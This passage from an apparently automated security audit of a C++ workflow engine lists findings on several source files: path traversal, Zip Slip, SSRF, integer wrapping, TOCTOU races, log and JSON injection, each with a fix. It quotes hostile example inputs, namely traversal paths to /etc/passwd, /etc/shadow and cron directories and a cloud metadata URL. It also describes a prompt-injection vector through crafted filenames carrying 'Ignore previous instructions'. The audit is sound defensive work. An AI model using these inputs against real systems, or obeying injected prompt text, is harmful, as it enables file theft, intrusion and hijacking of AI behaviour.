- **Fix:** Add an explicit `assert(!secret.empty())` or a hard early-return with an error log inside `AddWebhookTrigger` itself, so the defensive check exists at the point of registration regardless of upstream validation.


---

### 96_doc_application_workflow_workflowFileIndex_h

<a id="96-doc-application-workflow-workflowfileindex-h"></a>

*Source doc:* `../../../queue/jarvisCppCyberSecAudit/96_doc_application_workflow_workflowFileIndex_h/docu.output.md`



### MEDIUM Path Traversal via `FindByRelativePath`
- **Location:** `WorkflowFileIndex::FindByRelativePath`, implementation file ~line 80
- **Issue:** The caller-supplied `relativePath` string is appended directly to `m_RootDirectory` with `operator/` and then normalized with `lexically_normal()`. `lexically_normal()` resolves `..` components purely lexically, so a path like `../../etc/passwd` will produce a candidate that lies outside the intended root directory. There is no check that the resulting `candidate` is actually a descendant of `m_RootDirectory` before testing existence and returning the path to the caller.
- **Impact:** Any code that passes untrusted input (e.g., a workflow name from an HTTP request, a JSON field, an AI-generated string) to this function can enumerate or expose the existence of arbitrary files reachable by the process, and the returned path will subsequently be opened or read by the engine.
- **Fix:** After computing `candidate`, verify confinement with an `is_prefix` check using the real, canonical paths:
  ```
  std::filesystem::path const canonRoot = std::filesystem::canonical(m_RootDirectory, ec);
  std::filesystem::path const canonCandidate = std::filesystem::weakly_canonical(candidate, ec);
  if (ec || !canonCandidate.string().starts_with(canonRoot.string() + std::filesystem::path::preferred_separator))
      return {};
  ```
  Use `canonical` (not `lexically_normal`) on both paths so symlinks cannot be used to escape the root either.

---

### MEDIUM Symlink Escape During Directory Scan (`ScanDirectory`)
- **Location:** `WorkflowFileIndex::ScanDirectory`, implementation file ~line 45–65
- **Issue:** `std::filesystem::recursive_directory_iterator` follows symbolic links by default when the directory entry is itself a directory symlink (on most implementations). A symbolic link inside `rootAbsolute` that points outside the tree will cause files outside the intended directory to be indexed and returned by `FindByBasename` and `GetAllFiles`. The hidden-file filter only checks name prefixes, not link targets.
- **Impact:** An attacker who can plant a symlink inside the workflow directory (e.g., through a misconfigured file-write path elsewhere in the engine) can cause the index to include and later serve arbitrary files on the filesystem.
- **Fix:** Construct the iterator with `std::filesystem::directory_options::skip_permission_denied` and explicitly **without** `std::filesystem::directory_options::follow_directory_symlink`. For each non-directory entry that `is_symlink()`, resolve with `canonical` and confirm the resolved path is under `rootAbsolute` before indexing it.

---

### MEDIUM Uncontrolled Resource Consumption / DoS via Unbounded Scan
- **Location:** `WorkflowFileIndex::ScanDirectory`, implementation file ~line 44
- **Issue:** There is no limit on the number of files indexed, total bytes accumulated in `m_AllFiles`/`m_BasenameIndex`, or depth of directory recursion. If an attacker can influence what directory is scanned (or plant many files/deep trees in it), memory allocation grows without bound. The mutex is held for the entire scan duration, blocking all readers for an arbitrary time.
- **Impact:** An attacker with write access to the scanned directory (or the ability to set `rootDir`) can cause the process to exhaust memory or hold the mutex indefinitely, denying service to other engine threads.
- **Fix:** Impose a hard cap (e.g., 100 000 files) and abort the scan with a logged error if exceeded. Consider doing the scan outside the lock and then swapping the completed index in under a brief lock.

---

### LOW TOCTOU Between `exists()` Check and Subsequent File Open
- **Location:** `WorkflowFileIndex::FindByRelativePath`, implementation file ~line 83–88
- **Issue:** The function checks `std::filesystem::exists(candidate)` and returns the path; the caller then opens the file in a separate operation. Between the `exists` check and the open, the file can be replaced (e.g., with a symlink pointing elsewhere). This is a classic TOCTOU pattern.
- **Impact:** On systems where the workflow directory is world-writable or attacker-influenced, the attacker can swap the file between the check and the read, causing the engine to read an unintended file.
- **Fix:** The caller should open the file with `O_NOFOLLOW` (POSIX) or equivalent and validate the opened file descriptor's inode/attributes rather than relying on the pre-open existence check. Removing the `exists` check and letting the open call fail naturally is safer.

---

### LOW Untrusted Content Injected into AI Prompts via `SerializeMarkdownListing`
- **Location:** `WorkflowFileIndex::SerializeMarkdownListing`, implementation file ~line 103–118
- **Issue:** File basenames and relative paths are embedded verbatim into a Markdown string described as "suitable for injecting into AI generation prompts." A filename containing Markdown control characters, newlines, or prompt-injection payloads (e.g., `\nIgnore previous instructions and...`) will be passed unsanitized to the AI provider.
- **Impact:** An attacker who can create files with crafted names inside the workflow directory can inject arbitrary content into AI prompts, potentially manipulating model behavior or exfiltrating context via the AI response channel.
- **Fix:** Sanitize each path component before appending: strip or escape newlines, carriage returns, and Markdown special characters. At minimum, assert that `relPath.generic_string()` contains no newline or carriage-return characters and drop or encode entries that do.


---

### 97_doc_application_workflow_workflowJsonParser_h

<a id="97-doc-application-workflow-workflowjsonparser-h"></a>

*Source doc:* `../../../queue/jarvisCppCyberSecAudit/97_doc_application_workflow_workflowJsonParser_h/docu.output.md`



### HIGH Unvalidated path traversal in file/queue path fields

- **Location:** `ParseTask` (~file_inputs/file_outputs loops, ~middle of function), `ReadQueueFileRefArray` (~all path assignments)
- **Issue:** `taskOut.m_FileInputs`, `taskOut.m_FileOutputs`, and every `QueueFileRef::m_Path` value are copied directly from JSON strings with no normalization or containment check. `IsRelativePathString` is called only for diagnostic logging; its return value is never used to reject input. A path like `../../etc/passwd`, `../../secrets/api_key`, or an absolute path such as `/etc/shadow` passes through unchallenged.
- **Impact:** Depending on how downstream executors consume these paths, an attacker who can supply a crafted workflow JSON can read or overwrite arbitrary files accessible to the process, exfiltrate secrets, or overwrite binaries/configs.
- **Fix:** After accepting each path string, call `std::filesystem::weakly_canonical` on the resolved path (relative to the workflow's `m_WorkflowBaseDirectory`) and verify the result starts with the canonical base directory. Reject any path that escapes the base, and reject absolute paths outright (flip the `IsRelativePathString` guard from logging to enforcement).

---

### HIGH Unvalidated `base_directory` / `working_directory` accepted without containment check

- **Location:** `ParseRootObject` (`base_directory` branch, ~midway), `ParseTask` (`working_directory` branch)
- **Issue:** `outputDefinition.m_WorkflowBaseDirectory` and `taskOut.m_WorkingDirectory` are stored from user-controlled JSON without any validation. An attacker can set either to `"../../"` or an absolute system path. The diagnostic log confirms `IsRelativePathString` is checked only for logging.
- **Impact:** Enables path traversal to any directory the process can reach, both for reading inputs and writing outputs, and sets the working directory for shell/python tasks to an attacker-chosen location.
- **Fix:** Enforce that `working_directory` is relative and resolves within the workflow's canonical base directory. Apply the same canonical-path containment check as described for file paths above.

---

### HIGH Negative `timeout_ms` silently wraps to large `uint64_t`

- **Location:** `ParseTask`, `timeout_ms` branch (~two thirds through the function)
- **Issue:** `value.get_int64()` is used to read `timeout_ms`, then the result is cast directly to `uint64_t` without checking for negative values. A JSON value of `-1` becomes `UINT64_MAX` (18446744073709551615 ms ≈ 584 million years).
- **Impact:** An attacker can effectively disable task timeouts by supplying a negative integer, enabling denial-of-service through runaway tasks.
- **Fix:** After `get_int64()` succeeds, check `value >= 0` before casting. Alternatively use `get_uint64()` directly and reject the field if it fails.

---

### HIGH Same signed-to-unsigned truncation in `ParseRetries`

- **Location:** `ParseRetries`, `max_attempts` and `backoff_ms` branches
- **Issue:** Both fields are read with `get_int64()` then cast to `uint32_t`. A negative value wraps to a large positive number (e.g., `-1` → `4294967295` retries or a ~49-day backoff). A very large positive int64 also silently truncates.
- **Impact:** Attacker-controlled retry count → unbounded task re-execution (DoS); attacker-controlled backoff → effectively infinite delays or immediate hammering of downstream systems.
- **Fix:** Use `get_uint64()` and validate the value fits in `uint32_t` (i.e., `<= UINT32_MAX`) before casting. Enforce a sane upper bound (e.g., max 100 retries, max backoff 3,600,000 ms).

---

### HIGH Inline queue file content (`m_Content`) is unbounded

- **Location:** `ReadQueueFileRefArray`, object-type branch (~line where `contentText` is assigned)
- **Issue:** The `"content"` field of a queue file object is accepted as an arbitrary-length JSON string and stored verbatim in `fileRef.m_Content`. There is no size limit.
- **Impact:** A malicious workflow JSON can embed megabytes or gigabytes of base64 or plaintext content, causing uncontrolled heap allocation and OOM-based denial of service.
- **Fix:** Enforce a maximum content length before constructing the `std::string` (e.g., reject content exceeding a configurable limit such as 1 MB).

---

### MEDIUM Workflow and task IDs are not validated before use in error messages (log injection)

- **Location:** `ParseTask` (LOG_CORE_WARN and LOG_APP_INFO calls throughout), `ParseTrigger` (LOG_CORE_WARN call)
- **Issue:** `taskOut.m_Id`, `taskOut.m_Type`, file paths, and other user-supplied strings are interpolated directly into structured log messages (via `LOG_APP_INFO`/`LOG_CORE_WARN`) without sanitization. If the logging back-end writes to a terminal, file, or log aggregator that interprets newlines or special characters, an attacker can inject spurious log lines or corrupt log structure.
- **Impact:** Log injection / log forgery. In structured-logging pipelines this can cause false audit entries or obscure real events.
- **Fix:** Sanitize or escape user-supplied strings (strip `\n`, `\r`, and any log-format metacharacters) before including them in log calls, or use a logging API that treats all arguments as opaque data fields rather than format strings.

---

### MEDIUM Unbounded number of tasks, triggers, dataflow edges, etc.

- **Location:** `ParseTasks` (not shown but called from `ParseRootObject`), `ParseTriggers`, `ParseDataflow`, `ParseFilters`, `ParseControlNodes`, `ParseControlflow`
- **Issue:** None of the array/object parsers enforce a maximum element count. A crafted JSON with thousands of tasks or millions of dataflow edges will allocate unbounded memory.
- **Impact:** Denial of service via memory exhaustion on any endpoint that accepts workflow JSON from external or semi-trusted sources.
- **Fix:** Add element count limits (e.g., max 1000 tasks, max 10000 dataflow edges) at the top of each collection parser loop, returning an error when exceeded.

---

### MEDIUM `ParseGlobalJson` silently swallows parse and validation errors

- **Location:** `ParseGlobalJson`, `triggers` and `defaults` branches
- **Issue:** `ParseTriggers(...)` and `ParseDefaults(...)` return `bool` indicating success or failure, but in `ParseGlobalJson` the return values are discarded. Similarly, `ExtractRawJson` failure for `doc` and `defaults` fields is silently ignored. An error in triggers or defaults leaves `workflowOut` in a partially initialized state without informing the caller.
- **Impact:** Malformed trigger or defaults JSON silently produces a partially constructed `WorkflowDefinition` that may be used with default-zero values for timeouts and retry policies, potentially bypassing intended limits or causing unexpected behavior at runtime.
- **Fix:** Check all return values and propagate failures (set `errorMessage` and return `false`) consistently in `ParseGlobalJson`, matching the behavior of `ParseRootObject`.

---

### MEDIUM `output_retries` silently truncates large `uint64_t` to `uint32_t`

- **Location:** `ParseTask`, `output_retries` branch
- **Issue:** `retriesValue` is read as `uint64_t` then cast to `uint32_t` (`taskOut.m_OutputSchemaMaxAttempts`) with no range check. Values above `UINT32_MAX` silently truncate.
- **Impact:** An attacker can supply a value that appears large but wraps to a small number (or 0), bypassing the intended retry cap on schema validation.
- **Fix:** Validate `retriesValue <= UINT32_MAX` (and enforce a sane maximum) before casting.

---

### LOW `workflow_file` task field is accepted without path validation

- **Location:** `ParseTask`, `workflow_file` branch
- **Issue:** `taskOut.m_WorkflowFile` is stored verbatim from JSON. For `sub_workflow` task types this is presumably used to locate and load another workflow file. No relative-path or containment check is applied at parse time.
- **Impact:** If the engine later uses `m_WorkflowFile` to open a file, an attacker can traverse to load arbitrary workflow definitions outside the intended directory.
- **Fix:** Apply the same canonical-path containment validation as recommended for `file_inputs`/`file_outputs`.

---

### LOW User-supplied workflow and task IDs are not constrained to a safe character set

- **Location:** `ParseRootObject` (`id` field), `ParseTask` (`id` field), `ParseTrigger` (`id` field)
- **Issue:** IDs are accepted as arbitrary Unicode strings. These IDs are used as map keys, in error messages, in log lines, and are likely used downstream as file names, URL path segments, or database keys. No allowlist (e.g., `[a-zA-Z0-9_-]`) is enforced.
- **Impact:** Depending on downstream usage: path traversal via ID-derived filenames, log injection, or injection into downstream systems (e.g., if an ID is interpolated into a shell command or URL without escaping).
- **Fix:** Validate IDs against a strict allowlist pattern (e.g., `^[a-zA-Z0-9_\-]{1,128}$`) immediately after extraction and reject any ID that does not conform.


---

### 98_doc_application_workflow_workflowJsonParserDetails_h

<a id="98-doc-application-workflow-workflowjsonparserdetails-h"></a>

*Source doc:* `../../../queue/jarvisCppCyberSecAudit/98_doc_application_workflow_workflowJsonParserDetails_h/docu.output.md`



### MEDIUM Path traversal via unvalidated `path` and `index_path` fields

- **Location:** `WorkflowJsonParser::ParseFilterSource`, approximately where `key == "path"` and `key == "index_path"` are handled (roughly lines 620–640 relative to the parser implementation block)
- **Issue:** The values of `sourceOut.m_Path` and `sourceOut.m_IndexPath` are copied verbatim from attacker-controlled JSON with no sanitization. If downstream code uses these to open files (e.g., CSV, index files), a value such as `../../etc/passwd` or an absolute path like `/etc/shadow` passes through without restriction.
- **Impact:** An attacker who controls workflow JSON can read arbitrary files accessible to the process.
- **Fix:** After populating `m_Path` and `m_IndexPath`, reject any value that contains `..` path components or is an absolute path, or canonicalize the path against an allowed base directory and verify the result stays within it.

---

### MEDIUM Path traversal via unvalidated `base_url` field (SSRF)

- **Location:** `WorkflowJsonParser::ParseFilterSource`, approximately where `key == "base_url"` is handled
- **Issue:** `sourceOut.m_BaseUrl` is accepted verbatim from JSON. If any downstream HTTP client uses this value to construct outbound requests without validation, an attacker can supply `http://169.254.169.254/` (cloud metadata endpoint), `http://internal-service/`, or a `file://` URI.
- **Impact:** Server-side request forgery enabling access to internal services, cloud metadata APIs, or local files.
- **Fix:** Validate `m_BaseUrl` against an allowlist of permitted schemes (`https`) and hosts/prefixes before storing it. Reject `file://`, `ftp://`, private IP ranges, and link-local addresses.

---

### MEDIUM Negative/overflow integer narrowing in `max_items` and `page_size`

- **Location:** `WorkflowJsonParser::ParseFilter` (`key == "max_items"`) and `WorkflowJsonParser::ParseFilterSource` (`key == "page_size"`)
- **Issue:** Both fields are read as `int64_t` via `get_int64()` and then cast directly to `uint32_t` without range checking. A JSON value of `-1` becomes `4294967295` after the cast. A value larger than `UINT32_MAX` silently truncates.
- **Impact:** An attacker supplying a crafted workflow can cause extremely large allocation or iteration counts downstream, leading to denial of service or logic errors in consumers that trust these bounds.
- **Fix:** Before the cast, verify the raw `int64_t` value is in `[0, UINT32_MAX]` (or a tighter domain-appropriate maximum) and return an error if it is out of range.

---

### MEDIUM Secrets and internal identifiers logged verbatim

- **Location:** `WorkflowJsonParser::ParseFilter`, the `LOG_APP_INFO` call near the end of the function
- **Issue:** The log line emits `filterOut.m_Id`, `filterOut.m_Source.m_Kind`, `filterOut.m_Binding`, and `filterOut.m_MaxItems` at INFO level. `m_Binding` is a queue binding name and, depending on naming conventions, may embed credentials, API keys, or internal topology. `m_Id` values may also carry environment-specific identifiers that aid attackers in reconnaissance if logs are exposed.
- **Impact:** Log aggregation systems, monitoring dashboards, or log file read access can expose binding identifiers or other sensitive workflow topology.
- **Fix:** Log at DEBUG level rather than INFO, or redact/hash `m_Binding` before logging. If INFO-level logging is required for operational reasons, restrict it to a non-sensitive summary (e.g., the count of parsed filters).

---

### LOW Unvalidated `query` field stored without sanitization

- **Location:** `WorkflowJsonParser::ParseFilterSource`, approximately where `key == "query"` is handled
- **Issue:** `sourceOut.m_Query` is stored verbatim from JSON. Without seeing how it is consumed, if it is later interpolated into a database query, search DSL, or shell command, it is a direct injection vector.
- **Impact:** Depending on downstream use: SQL injection, NoSQL injection, command injection, or search-engine query injection.
- **Fix:** At minimum, document the expected format and add a validation step (e.g., allowlisted characters, length limit) before the value leaves the parser. If it feeds a structured query API, use parameterized queries rather than string interpolation at the call site.

---

### LOW Unbounded array and map growth — no size limits

- **Location:** `WorkflowJsonParser::ParseTriggers`, `ParseControlNodes`, `ParseControlflow`, `ParseDataflow`, `ParseFilters`, `ParseTaskInputs`, `ParseTaskOutputs`; the `push_back` / map-insert loops throughout
- **Issue:** No maximum element count is enforced on any parsed collection. A JSON document with millions of array entries or map keys will cause proportional heap allocation before any error is returned.
- **Impact:** A crafted workflow document can exhaust process memory, causing denial of service.
- **Fix:** Impose a reasonable upper bound (e.g., 10 000 entries) on each collection and return an error if the limit is exceeded.

---

### LOW Log injection via attacker-controlled field names and values

- **Location:** All `LOG_CORE_WARN("Unknown field in …: {}", key)` calls throughout the file (e.g., in `ParseControlNodes`, `ParseControlflow`, `ParseTaskInputs`, `ParseTaskOutputs`, `ParseTaskEnvironment`, `ParseFilterSource`)
- **Issue:** The `key` string is sourced directly from attacker-supplied JSON and written into structured log output without sanitization. If the logging backend interprets newline characters, format specifiers, or ANSI escape sequences in the rendered message, an attacker can inject false log lines or corrupt log formatting.
- **Impact:** Log forging, potential confusion of security monitoring systems, or terminal escape injection if logs are displayed interactively.
- **Fix:** Sanitize `key` before logging by stripping or escaping control characters and newlines, or enforce a maximum length. Most structured logging libraries handle format-string injection when using `{}` placeholders (as appears to be the case here), but newline injection remains a risk.

### 99_doc_application_workflow_workflowRegistry_h

<a id="99-doc-application-workflow-workflowregistry-h"></a>

*Source doc:* `../../../queue/jarvisCppCyberSecAudit/99_doc_application_workflow_workflowRegistry_h/docu.output.md`



### HIGH Path Traversal via Unvalidated Workflow ID Used as Filename

- **Location:** `WorkflowRegistry::SaveOrUpdateWorkflowFromJson`, line where `canvasJsonPath` is constructed as `extractedDir / (workflowId + ".json")`
- **Issue:** `workflowDefinition.m_Id` is parsed directly from attacker-supplied JSON and then concatenated into a filesystem path without any validation. A workflow ID containing `../` sequences or absolute path components (e.g., `../../etc/cron.d/evil`) will cause the canvas JSON to be written outside the intended directory.
- **Impact:** Arbitrary file write to any path writable by the process. Combined with the fact that the content written is the raw `workflowJson` supplied by the caller, this is a full arbitrary-content write primitive — sufficient for code execution on many platforms (e.g., writing cron jobs, SSH authorized_keys, Python scripts in watched directories).
- **Fix:** After parsing, validate that `workflowDefinition.m_Id` matches a strict allowlist pattern (e.g., `^[a-zA-Z0-9_\-]+$`). Additionally, after constructing `canvasJsonPath`, assert that `std::filesystem::weakly_canonical(canvasJsonPath)` is a child of `extractedDir` before opening the file for writing.

---

### HIGH Path Traversal via Unvalidated Sub-Workflow Folder Name in ID Generation

- **Location:** `WorkflowRegistry::LoadContainerSubWorkflows`, line constructing `subDef.m_Id = parentWorkflowId + "__" + folderName`
- **Issue:** `folderName` comes from `std::filesystem::directory_iterator` over an extracted zip archive. Zip archives can contain entries with names like `../evil` or absolute paths. If `JcwfContainer::Extract` does not sanitize entry names before writing to disk (not shown but critical), the extracted folder structure itself can escape `extractedDir`. Even if extraction is safe, `folderName` with `..` components will propagate into the workflow ID and `subRelPath`, poisoning the registry with crafted IDs.
- **Impact:** Depending on extraction behavior: directory traversal during extraction leading to arbitrary file write; or registry poisoning with IDs containing path separators that may be misused downstream when IDs are reflected into paths.
- **Fix:** In `LoadContainerSubWorkflows`, validate that `folderName` contains no path separators and no `..` component before processing the entry. In `JcwfContainer::Extract` (not reviewed but implicated), canonicalize every archive entry name and reject any that escape the target directory.

---

### HIGH Uncontrolled File Read Size — No Limit in `ReadFileToStringStatic`

- **Location:** `ReadFileToStringStatic`, lines performing `seekg`/`resize`/`read`
- **Issue:** The file is `resize`d to its full reported size and read entirely into memory with no upper bound. A malicious or corrupted `.jcwf` container (or a crafted symlink/sparse file in the workflows directory) can report an arbitrarily large size, causing `outText.resize(size)` to attempt a multi-gigabyte allocation. On a 32-bit `streamoff` platform this also truncates silently; on 64-bit it will exhaust memory.
- **Impact:** Denial of service: the process is killed by OOM or hangs on allocation; can be triggered by dropping a crafted file into the watched workflows directory.
- **Fix:** Impose a sane maximum (e.g., 64 MB) immediately after reading `size`. If `size` exceeds the limit, log an error and return `false` without allocating.

---

### HIGH Zip Slip — Extraction Safety of `JcwfContainer::Extract` Not Verified

- **Location:** `WorkflowRegistry::LoadContainer`, call to `JcwfContainer::Extract(jcwfContainerPath, extractedDir, extractError)`
- **Issue:** The extraction implementation is not shown. If `JcwfContainer::Extract` does not canonicalize and validate every archive member's path against `extractedDir` before writing, a crafted `.jcwf` archive can write files anywhere on disk (classic Zip Slip). The rest of the code trusts the extracted directory contents completely.
- **Impact:** Arbitrary file write → remote code execution, credential theft, or persistent backdoor.
- **Fix:** In `JcwfContainer::Extract`, for every archive entry, resolve the final output path, call `std::filesystem::weakly_canonical`, and reject any entry whose canonical path does not begin with the canonical form of `extractedDir`. This must be done before any file is created or opened for writing.

---

### MEDIUM TOCTOU Between `exists()` Check and File Open in `SaveOrUpdateWorkflowFromJson`

- **Location:** `WorkflowRegistry::SaveOrUpdateWorkflowFromJson`, the block checking `std::filesystem::exists(globalJsonPath)` then either reading or writing it
- **Issue:** There is a check-then-act race: between the `exists()` call and the subsequent `ReadFileToStringStatic` or `std::ofstream` open, another process or thread can create, delete, or replace `globalJsonPath`. On systems where the workflows directory is world-writable or accessible to other processes this is exploitable.
- **Impact:** An attacker who can race the filesystem can cause the wrong global.json to be read (metadata injection) or the `else` branch to overwrite a file that now exists (data loss or content injection into the registry).
- **Fix:** Open the file with exclusive flags (`O_CREAT | O_EXCL` on POSIX, or `open_existing`/`create_new` semantics) rather than checking existence first. For the read path, open unconditionally and handle failure, removing the separate `exists()` check.

---

### MEDIUM Secrets and Parse Errors Written Verbatim into `BrokenWorkflow::m_Error` and Returned to Callers

- **Location:** `WorkflowRegistry::LoadDirectory`, construction of `BrokenWorkflow::m_Error` from `ex.what()` and `m_LastContainerError`; similarly in `RemoveWorkflow` where `errorMessage` includes the raw file path and OS error
- **Issue:** Exception messages and OS error strings may contain internal path information, partial file content, or OS-level detail about the system layout. These are stored in `m_BrokenWorkflows` (accessible via `GetBrokenWorkflows()`) and returned through `errorMessage` output parameters, which callers may forward to UI or API responses.
- **Impact:** Information disclosure: internal directory structure, OS version details, and potentially fragments of workflow content (if a parser error quotes the offending JSON) are exposed to clients.
- **Fix:** Log the full detail internally at `LOG_APP_ERROR`; return only a generic, sanitized message through `m_Error`/`errorMessage` (e.g., "Container parse failed; see server log for details"). Avoid embedding raw OS error strings in user-facing outputs.

---

### MEDIUM Global JSON Written with Unescaped String Values

- **Location:** `WorkflowRegistry::SaveOrUpdateWorkflowFromJson`, the `ofstream` block writing `global.json` manually
- **Issue:** `workflowDefinition.m_Version` and `workflowId` are interpolated directly into a hand-built JSON string with `<<` without any JSON escaping. If either value contains `"`, `\`, or newline characters, the output is malformed JSON. If those values are attacker-controlled (they come from parsed user-supplied JSON), an attacker can inject arbitrary JSON structure into `global.json`.
- **Impact:** JSON injection into `global.json`: the attacker can add or overwrite fields (e.g., inject a `triggers` array, change `manual_start`), altering workflow behavior on next load.
- **Fix:** Use a proper JSON serialization library (the project already uses one for parsing) to construct and write `global.json` rather than manual string concatenation.

---

### LOW Workflow ID Reflected into Log Messages Without Sanitization

- **Location:** `WorkflowRegistry::LoadContainer` (`LOG_APP_INFO` logging `rootId`), `WorkflowRegistry::LoadContainerSubWorkflows` (`LOG_APP_INFO` logging `subId`), and multiple `LOG_APP_WARN` calls throughout
- **Issue:** Workflow IDs and file paths derived from attacker-controlled archive content are logged directly. If the logging backend writes to a terminal or a log viewer that interprets escape sequences or ANSI codes, crafted IDs containing such sequences can corrupt log display or, in pathological cases, inject false log entries.
- **Impact:** Log injection / log forgery; terminal escape injection if logs are viewed in a raw terminal.
- **Fix:** Sanitize strings from external sources before logging: strip or escape non-printable characters and control sequences. Alternatively, ensure the logging framework quotes or escapes its arguments.
